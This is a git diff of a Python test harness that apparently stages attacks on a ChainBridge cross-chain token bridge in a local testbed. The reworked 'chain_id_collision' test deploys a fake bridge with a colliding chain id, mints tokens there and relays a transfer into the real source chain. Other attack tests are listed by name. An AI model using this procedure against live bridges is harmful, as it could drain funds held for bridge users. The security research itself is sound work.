@@ -9,7 +9,7 @@ from utils.conntrack_mod import ConnTrack
 from model.node import Node
 from model.contract import ContractTypes
 from urllib.parse import urlparse
-from utils.cb_wrapper import CBWrapper
+from utils.cb_wrapper import CONFIG_JSON_FILE, CBWrapper
 from utils.sys_mod import ssh_helper
 from utils.resource_manager import *
 from utils.cc_redeem import redeem_tokens, token_of_owner_by_index
@@ -94,7 +94,6 @@ def deploy_main_bridge(source: Node, dest: Node, type: ContractTypes):
                           ContractTypes.ERC721_HANDLER, ContractTypes.ERC721]
     _deploy_contracts(source, contracts_source)
     _deploy_contracts(dest, contracts_dest)
-    # The vulnerability in the whole process is the fact that the user is the ralayer
     res_id_origin = _register_resource(source, None, type)
     _register_resource(dest, res_id_origin, type)
     cb.update_config_json(source, type)
@@ -355,11 +354,6 @@ def _config_bridge_fakechain(dest: Node, type: ContractTypes):
         contracts_dest = [ContractTypes.BRIDGE,
                           ContractTypes.ERC721_HANDLER, ContractTypes.ERC721]
     _deploy_contracts(dest, contracts_dest)
-    # Add pre-deployed bridge. This step is required because the bridge
-    # version in cb-sol-cli is different and does not provide the
-    # adminSetDepositNonce required for this attack
-    # https://github.com/ChainSafe/chainbridge-solidity/issues/253
-    add_contract("bridge", BRIDGE_SET_NONCE, 45, int(time.time())+1)
     res_id = available_resources(n0.chain_id, available_contracts(
         n0.chain_id, ContractTypes.ERC20)['target'].id)
     # Register the resource with the same id as source
@@ -368,15 +362,22 @@ def _config_bridge_fakechain(dest: Node, type: ContractTypes):
     cb.stop_relay()
 
 
-def bridge_deflection(dest: Node, type: ContractTypes):
-    # The new bridge overwrites the contracts for chain 45,
-    # so we backup the file to restore it after the test finishes
+def chain_id_collision(dest: Node, type: ContractTypes):
+    # The vulnerability in the whole process is the fact that the user is the ralayer.
+    # This test overwrites the chains contracts, so we bacukup the resources.
     shutil.copy(BC_RESOURCES_PATH, BC_RESOURCES_PATH + ".old")
+    shutil.copy(CONFIG_JSON_FILE, CONFIG_JSON_FILE + ".old")
+    # Deploy a new bridge between chain n0 and n1 so that the nonce of the
+    # transfer is 0. With the new bridge version this passage is not required
+    # because we can increment the bridge nonce with adminSetDepositNonce function
+    deploy_main_bridge(n0, n1, ContractTypes.ERC20)
+    # Deployment and configuration the fakechain bridge
     _config_bridge_fakechain(dest, type)
     contracts = available_contracts(dest.chain_id, ContractTypes.ERC20)
     # Set deposit nonce on bridge (fake chain) otherwise the dest chain sees that
-    # this deposit already exists.
-    with open('crosscoin/build/contracts/NewBridge.json') as f:
+    # this deposit already exists. This is only available on new bridge contract.
+    # https://github.com/ChainSafe/chainbridge-solidity/issues/253
+    '''with open('crosscoin/build/contracts/NewBridge.json') as f:
         abi = json.loads(f.read())['abi']
     contract = dest.provider.eth.contract(
         address=contracts['bridge'].address, abi=abi)
@@ -389,20 +390,21 @@ def bridge_deflection(dest: Node, type: ContractTypes):
     signed_tx = dest.provider.eth.account.sign_transaction(tx, acc.key)
     tx_hash = dest.provider.eth.send_raw_transaction(
         signed_tx.rawTransaction)
-    logging.info("adminSetDepositNonce tx_hash: " + tx_hash.hex())
+    logging.info("adminSetDepositNonce tx_hash: " + tx_hash.hex())'''
     # Mint token on fake source (chain 2)
     cb.add_minter(dest.node_endpoint, acc.key.hex(),
                   10000000, ContractTypes.ERC20, acc.address,
                   contracts['target'].address)
-    redeem_tokens(dest.provider, acc, dest.provider.toWei(
-        1, "Ether"), ContractTypes.ERC20)
-    # Balance on source before generating the event
+    # Balance on source before generating transfer
     cb.balance(n0.node_endpoint, ContractTypes.ERC20,
                acc.address, available_contracts(n0.chain_id,
                                                 ContractTypes.ERC20)['target'].address)
-    # Send the tokens to source from chain 2 (fakechain)
-    cb.start_relay(latest=True)
+    # We leave some tokens inside the dest bridge
+    simple_token_transfer(acc, 1, ContractTypes.ERC20, n0, n1, True)
+    redeem_tokens(dest.provider, acc, dest.provider.toWei(
+        1, "Ether"), ContractTypes.ERC20)
     simple_token_transfer(acc, 1, ContractTypes.ERC20, dest, n0, False)
+    cb.start_relay(latest=True)
     time.sleep(WAIT)
     # Balance after event transmission
     cb.balance(n0.node_endpoint, ContractTypes.ERC20,
@@ -410,7 +412,9 @@ def bridge_deflection(dest: Node, type: ContractTypes):
                                                 ContractTypes.ERC20)['target'].address)
     # Restore bc_resources db and old config.json file
     os.remove(BC_RESOURCES_PATH)
+    os.remove(CONFIG_JSON_FILE)
     os.rename(BC_RESOURCES_PATH+".old", BC_RESOURCES_PATH)
+    os.rename(CONFIG_JSON_FILE+".old", CONFIG_JSON_FILE)
     cb.update_config_json(n1, type)
     cb.stop_relay()
 
@@ -418,8 +422,8 @@ def bridge_deflection(dest: Node, type: ContractTypes):
 def tests():
     logging.info("Starting tests.")
     # deploy_main_bridge(n0, n1, ContractTypes.ERC20)
-    # simple_token_transfer(1, ContractTypes.ERC20, n0, n1, True)  # Foward
-    # simple_token_transfer(1, ContractTypes.ERC20, n1, n0) # Backward
+    # simple_token_transfer(acc, 1, ContractTypes.ERC20, n0, n1, True)  # Foward
+    # simple_token_transfer(acc, 1, ContractTypes.ERC20, n1, n0) # Backward
     # transfer_conn_lock()
     # transfer_conn_lock_back()
     # transfer_crosscoin_stealer()
@@ -427,7 +431,7 @@ def tests():
     # erc20_overflow()
     # malicious_rollback()
     # concussion_attack()
-    bridge_deflection(n2, ContractTypes.ERC20)
+    chain_id_collision(n2, ContractTypes.ERC20)
     logging.info("Finished tests.")
 
 
